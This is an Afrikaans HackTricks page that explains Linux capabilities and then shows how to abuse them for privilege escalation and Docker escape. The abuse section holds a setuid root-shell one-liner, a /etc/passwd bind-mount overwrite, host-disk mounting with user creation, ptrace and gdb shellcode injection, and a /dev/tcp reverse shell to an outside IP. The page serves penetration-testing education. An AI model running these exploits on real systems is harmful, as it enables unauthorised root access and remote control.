# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities verdeel **root-regte in kleiner, afsonderlike eenhede**, sodat prosesse ’n subset van regte kan hê. Dit beperk die risiko’s deur nie onnodig volle root-regte toe te ken nie.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Die probleem:

- Gewone gebruikers het beperkte toestemmings vir bewerkings soos die opening van rou sockets of die binding van Internet-poorte onder 1024; capabilities kan slegs die vereiste bewerking toestaan in plaas van volle root-regte.<sup>[[14]](#references)</sup>

### Capability-stelle:

Linux stel hierdie capability-stelle per thread beskikbaar, en die kernel pas hul beperkings toe wanneer ’n proses geloofsbriewe verander of ’n lêer uitvoer.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

   - **Doel**: Identifiseer capabilities wat tot die permitted-stel kan bydra ná `execve()` wanneer die uitgevoerde lêer ooreenstemmende inheritable file capabilities het.
   - **Funksionaliteit**: Die thread se inheritable-stel bly behoue oor `execve()`; dit maak nie op sigself daardie capabilities effective nie.
   - **Beperkings**: Die permitted- en bounding-stelle beperk die byvoeging van ’n capability tot hierdie stel.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

   - **Doel**: Verteenwoordig die capabilities wat ’n proses op enige gegewe oomblik gebruik.
   - **Funksionaliteit**: Dit is die stel capabilities wat die kernel nagaan om toestemming vir verskeie bewerkings toe te staan. Vir lêers kan hierdie stel ’n vlag wees wat aandui of die lêer se permitted capabilities as effective beskou moet word.
   - **Belang**: Die effective-stel is noodsaaklik vir onmiddellike regtekontroles en dien as die aktiewe stel capabilities wat ’n proses kan gebruik.

3. **Permitted (CapPrm)**:

   - **Doel**: Definieer die maksimum stel capabilities waaroor ’n proses kan beskik.
   - **Funksionaliteit**: ’n Proses kan ’n capability van die permitted-stel na sy effective-stel verskuif, sodat dit daardie capability kan gebruik. Dit kan ook capabilities uit sy permitted-stel laat vaar.
   - **Grens**: As ’n capability uit hierdie stel laat vaar word, kan dit normaalweg nie herstel word sonder om ’n lêer uit te voer wat dit toestaan of ’n ander bevoorregte oorgang nie.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

   - **Doel**: Beperk die capabilities wat ’n proses tydens `execve()` van ’n lêer kan verkry, asook dié wat dit by sy inheritable-stel kan voeg.
   - **Funksionaliteit**: Die stel word oor `fork()` geërf en bly behoue oor `execve()`; capabilities kan daaruit laat vaar word wanneer die oproeper `CAP_SETPCAP` het.
   - **Gebruik**: Deur onnodige capabilities uit hierdie stel te verwyder, word latere verkryging van regte beperk.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
   - **Doel**: Laat geselekteerde capabilities permitted en effective bly wanneer `execve()` ’n onbevoorregte program uitvoer.
   - **Funksionaliteit**: Ambient capabilities word by die nuwe permitted- en effective-stelle gevoeg wanneer die uitgevoerde lêer nie bevoorreg is nie.
   - **Beperkings**: ’n Capability kan slegs ambient wees terwyl dit in sowel die permitted- as die inheritable-stel voorkom; die uitvoer van ’n set-user-ID/set-group-ID-lêer of ’n lêer met capabilities maak die ambient-stel leeg.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities van prosesse en binaries

### Capabilities van prosesse

Gebruik die **status**-lêer in die /proc-gids om die capabilities van ’n spesifieke proses te sien. Omdat dit meer besonderhede verskaf, beperk ons dit tot die inligting oor Linux capabilities.\
Let daarop dat capability-inligting vir alle prosesse wat loop per thread bygehou word, terwyl file capabilities in uitgebreide `security.capability`-eienskappe gestoor word.<sup>[[14]](#references)[[15]](#references)</sup>

Jy kan die capabilities vind in /usr/include/linux/capability.h

Jy kan die capabilities van die huidige proses vind met `cat /proc/self/status` of `capsh --print`, en dié van ander prosesse in `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

Hierdie opdrag behoort op die meeste stelsels vyf capability-reëls terug te gee.<sup>[[15]](#references)</sup>

- CapInh = Geërfde capabilities
- CapPrm = Toegelate capabilities
- CapEff = Effektiewe capabilities
- CapBnd = Beperkingsstel
- CapAmb = Ambient capabilities-stel

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

Hierdie heksadesimale getalle maak nie sin nie. Deur die `capsh`-nutsprogram te gebruik, kan ons hulle na capability-name dekodeer.<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Kom ons kyk nou na die **capabilities** wat deur `ping` gebruik word:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Alhoewel dit werk, is daar ’n ander en makliker manier. Om die vermoëns van ’n lopende proses te sien, gebruik die **getpcaps**-nutsding, gevolg deur sy proses-ID (PID); dit aanvaar ook ’n lys proses-ID’s.<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

Kom ons kontroleer die capabilities van `tcpdump` nadat die binêre lêer `cap_net_admin` en `cap_net_raw` toegeken is om die netwerk te sniff (`tcpdump` loop in proses 9562).<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Soos jy kan sien, stem die capabilities ooreen met die resultate van die twee maniere om ’n proses te inspekteer. Die `getpcaps`-nutsding gebruik libcap om ’n teikenproses se capabilities navraag te doen en dit in teksvorm te vertoon; dit aanvaar een of meer PID’s.<sup>[[22]](#references)</sup>

### Capabilities van binêre lêers

Binêre lêers kan file capabilities hê wat tydens uitvoering toegepas word. Byvoorbeeld, ’n `ping`-binêre lêer kan die `cap_net_raw`-capability hê.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

Jy kan **binaries met capabilities** soek met `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Capabilities met capsh laat vaar

As ons `CAP_NET_RAW` uit die huidige bounding set verwyder, behoort ’n program wat daardie capability benodig dit nie meer te kan gebruik nie.<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Benewens die uitvoer van _capsh_ self, behoort die _tcpdump_-opdrag self ook ’n fout te gee.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Die fout wys dat `tcpdump` nie met die aangevraagde lêervermoë kan uitvoer nadat `CAP_NET_RAW` uit die bounding set verwyder is nie.

### Verwyder Capabilities

Jy kan ’n lêer se capabilities met `setcap -r` verwyder.<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## Gebruikers-Capabilities

Linux ken nie lêer-capabilities direk aan ’n aanmeldgebruiker toe nie, maar die `pam_cap` PAM-module kan oorerfbare capabilities vir geverifieerde sessies instel deur `/etc/security/capability.conf` te gebruik.<sup>[[16]](#references)</sup> Elke inskrywing koppel kommageskeide capability-name of -nommers aan een of meer gebruikers.<sup>[[17]](#references)</sup>
Lêervoorbeeld:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Omgewingsvermoëns

Deur die volgende program te compileer, kan jy ’n bash-shell laat begin binne ’n omgewing wat capabilities bied.<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

Binne die **bash wat deur die gecompileerde ambient-binary uitgevoer word**, is dit moontlik om die **nuwe capabilities** waar te neem (’n gewone gebruiker sal geen capability in die "current"-afdeling hê nie).<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> Jy kan **slegs capabilities byvoeg wat in beide die toegelate en oorerfbare stelle voorkom**.<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb binaries

’n Capability-dumb-binêre lêer is ’n program met file capabilities wat nie libcap gebruik om hulle te bestuur nie. As sy file effective-bit gestel is, aktiveer die kernel die file se toegelate capabilities in die proses se effektiewe stel; uitvoering kan misluk as die proses nie al die toegelate capabilities verkry het nie.<sup>[[14]](#references)</sup>

## Diens-capabilities

’n Stelseldiens wat as root loop, kan breë capabilities behou, tensy sy uitvoeringsomgewing dit beperk. In ’n systemd-eenheid kies `User=` die diensgebruiker, en `AmbientCapabilities=` voeg benoemde capabilities by die ambient-stel vir die uitgevoerde proses.<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Vermoëns in Docker-houers

Docker begin houers met ’n verstekstel vermoëns wat met `--cap-add` en `--cap-drop` verander kan word; ’n voorbeeldhouer kan met `amicontained` ondersoek word.<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Capabilities is nuttig wanneer jy **jou eie prosesse wil beperk nadat jy bevoorregte bewerkings uitgevoer het** (bv. nadat jy chroot opgestel en aan 'n socket gebind het). Dit kan egter uitgebuit word deur kwaadwillige opdragte of argumente daaraan deur te gee, wat dan as root uitgevoer word.<sup>[[2]](#references)</sup>

Jy kan lêervermoëns op programme afdwing met `setcap`, en hulle met `getcap` navraag doen.<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

Vir lêer-capability-teks verhoog +ep die genoemde capability in die effektiewe en toegelate stelle; - verlaag die geselekteerde vlae.<sup>[[21]](#references)</sup>

Gebruik getcap -r om programme met capabilities in ’n stelsel of vouer te identifiseer.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Uitbuitingsvoorbeeld

In die volgende voorbeeld word die binary `/usr/bin/python2.6` as kwesbaar vir privesc bevind:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** wat `tcpdump` nodig het om **enige gebruiker toe te laat om packets te sniff**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### Die spesiale geval van ’n weggelate capability-naam

In libcap se teksformaat beteken `getcap myelf` wat `myelf =ep` rapporteer dat **alle capabilities** as effective en permitted gemerk is, onderhewig aan die uitvoerende proses se bounding set, user namespace en ander uitvoeringsbeperkings. Die leë file capability-set is `myelf =` (sonder `e` of `p`); dit verskil van ’n lêer sonder ’n capability-kenmerk. ’n `=ep`-lêer verander nie op sigself die proses se UID na root nie, maar ’n program wat `CAP_DAC_READ_SEARCH` of `CAP_DAC_OVERRIDE` kan gebruik, kan lêers lees wat sy Unix-UID andersins nie sou kon lees nie. Bevestig die werklike uitvoerbare lêer se lêermodus, namespace en effective capabilities voordat jy die program se invoeropsies as ’n bevoorregte lêerleespad beskou. Sien libcap se [capability-teksformaat](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) en [gedrag vir leë waardes](https://man7.org/linux/man-pages/man8/getcap.8.html).<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** is ’n besonder kragtige Linux-capability, wat dikwels gelykgestel word aan ’n byna-root-vlak vanweë sy uitgebreide **administratiewe voorregte**, soos om toestelle te mount of kerneleienskappe te manipuleer. Hoewel dit onontbeerlik is vir houers wat volledige stelsels simuleer, **hou `CAP_SYS_ADMIN` aansienlike sekuriteitsuitdagings in**, veral in houeromgewings, weens die moontlikheid van voorregte-eskalasie en stelselkompromittering. Die gebruik daarvan vereis dus streng sekuriteitsbeoordelings en versigtige bestuur, met ’n sterk voorkeur daarvoor om hierdie capability in toepassing-spesifieke houers te laat vaar, sodat die **beginsel van minste voorreg** nagekom word en die aanvaloppervlak beperk word.<sup>[[14]](#references)</sup>

Vir namespace-pivots is die omvang belangrik: `setns()` kontroleer `CAP_SYS_ADMIN` teenoor die user namespace wat die teiken besit. Om ’n mount namespace binne te gaan, vereis ook `CAP_SYS_CHROOT` in die aanroeper se user namespace. ’n Capability wat slegs binne ’n private, herbepaalde user namespace gehou word, gee dus nie arbitrêre toegang tot die aanvanklike host-namespaces nie.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Deur python te gebruik, kan jy ’n gewysigde _passwd_-lêer bo-op die werklike _passwd_-lêer monteer:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

En laastens **mount** die gewysigde `passwd`-lêer op `/etc/passwd`:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

En jy sal **`su` as root** kan gebruik met die wagwoord "password".

**Voorbeeld met omgewing (Docker breakout)**

Jy kan die geaktiveerde capabilities binne die Docker-container nagaan deur:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

In die vorige uitvoer kan jy sien dat die SYS_ADMIN-vermoë geaktiveer is.<sup>[[14]](#references)</sup>

- **Mount**

Met geskikte toestel- en namespace-toegang kan dit ’n Docker-container toelaat om **’n gasheerskyf te mount en toegang tot die inhoud daarvan te verkry**. Die toestelnode moet ’n werklike gasheertoestel verteenwoordig, die toestel-cgroup moet dit toelaat, en om ’n blokgebaseerde lêerstelsel te mount, vereis `CAP_SYS_ADMIN` in die aanvanklike user namespace.<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **Volledige toegang**

Met die vorige metode kon ons toegang tot ’n gasheerskyf kry.\
As die gasheer ’n **ssh**-bediener gebruik, kan jy **’n gebruiker binne die gekoppelde skyf skep** en via SSH toegang daartoe kry.<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

Direkte lees- en skryfbewerkings onder `/mnt/host` is reeds toegang tot die host-lêerstelsel. Die finale `chroot` is slegs ’n gerief vir padname en vereis boonop `CAP_SYS_CHROOT`; dit is nie die stap wat die ontsnapping moontlik maak nie.

## CAP_SYS_PTRACE

Met `CAP_SYS_PTRACE` kan ’n proses ander prosesse naspoor en inspekteer wat in sy PID-naamruimte sigbaar is. Om host-prosesse vanuit ’n Docker-container te teiken, deel die host-PID-naamruimte met `--pid=host` (of sluit aan by ’n naamruimte wat die teiken bevat).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** verleen die vermoë om debugging- en stelseloproepnasporingsfunksies te gebruik wat deur `ptrace(2)` en oproepe vir gehegtheid oor geheue heen, soos `process_vm_readv(2)` en `process_vm_writev(2)`, verskaf word. Hoewel dit kragtig is vir diagnostiese en moniteringsdoeleindes, kan `CAP_SYS_PTRACE` die stelselsekuriteit aansienlik ondermyn as dit geaktiveer is sonder beperkende maatreëls soos ’n seccomp-filter op `ptrace(2)`. Dit kan veral uitgebuit word om ander sekuriteitsbeperkings te omseil, veral dié wat deur seccomp opgelê word, soos gedemonstreer deur [proofs of concept (PoC) soos hierdie een](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Voorbeeld met binary (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**Voorbeeld met binêre lêer (gdb)**

`gdb` met `ptrace`-vermoë:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

’n Capability op ’n debugger is slegs ’n leidraad vir hersiening. Kontroleer of die huidige proses daardie presiese lêer kan uitvoer (insluitend groep- en ACL-toestemmings), of `CAP_SYS_PTRACE` ná uitvoering effektief is, en of ’n teiken met hoër voorregte sigbaar is en aangeheg kan word in dieselfde PID-naamruimte. `no_new_privs`, ’n `nosuid`-aankoppeling, die capability-begrensingstel, Yama, seccomp of ’n LSM kan die resultaat verander. Sien [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) en [die kern se Yama-dokumentasie](https://docs.kernel.org/admin-guide/LSM/Yama.html). Lys lêer- en prosesmetadata sonder om aan ’n teiken te heg.

Skep shellcode met msfvenom om via gdb in die geheue in te spuit.

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

Ontfout ’n root-proses met gdb en kopieer-en-plak die voorheen gegenereerde gdb-reëls:

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**Voorbeeld met omgewing (Docker breakout) - Nog 'n gdb-misbruik**

As **GDB** geïnstalleer is (of jy dit byvoorbeeld met `apk add gdb` of `apt install gdb` kan installeer), kan jy **'n sigbare gasheerproses ontfout** en dit die `system`-funksie laat aanroep. Dit vereis effektiewe `CAP_SYS_PTRACE` in die teiken se gebruikersnaamruimte en sigbaarheid van gasheer-PID's; dit vereis **nie** `CAP_SYS_ADMIN` nie. Yama, 'n nie-dumpbare toestand, seccomp en LSM-beleid kan steeds verhoed dat die proses gekoppel word.

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

Jy sal nie die uitvoer van die uitgevoerde opdrag kan sien nie, maar dit sal deur daardie proses uitgevoer word (kry dus ’n rev shell).

> [!WARNING]
> As jy die fout "No symbol "system" in current context." kry, kyk na die vorige voorbeeld waar shellcode in ’n program via gdb gelaai word.

**Example with environment (Docker breakout) - Shellcode Injection**

Jy kan die geaktiveerde capabilities binne die docker-container nagaan met:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
